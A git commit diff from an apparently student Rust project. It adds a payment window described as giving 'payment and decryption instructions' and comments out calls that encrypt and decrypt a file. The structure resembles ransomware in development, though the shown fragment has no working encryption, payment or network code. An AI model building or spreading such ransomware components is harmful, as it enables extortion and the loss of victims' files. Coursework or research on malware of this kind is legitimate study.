31f065ee32bb5754d4946ca27895eb2b9015907d
20221219 <d.coello.luna@student.tue.nl>
2025-12-03 12:00:33 +0100

    Made a payment page with payment and decryption instructions.

--- src/main.rs
+++ src/main.rs
@@ -1,13 +1,15 @@
 mod cryptography;
+mod payment;
 use cryptography::encrypt::{ generate_key, encrypt_file, decrypt_file };
 
 use std::{path::Path};
 
 fn main() {
-    let (sec_key, pub_key) = generate_key();
+    payment::show_payment_window();
+    // let (sec_key, pub_key) = generate_key();
 
-    let path = Path::new(""); // CHANGE THIS TO SOME PATH
-    let encrypt_path = encrypt_file(path, &pub_key).unwrap();
+    // let path = Path::new(""); // CHANGE THIS TO SOME PATH
+    // let encrypt_path = encrypt_file(path, &pub_key).unwrap();
 
-    let _ = decrypt_file(&encrypt_path, &sec_key);
+    // let _ = decrypt_file(&encrypt_path, &sec_key);
 }
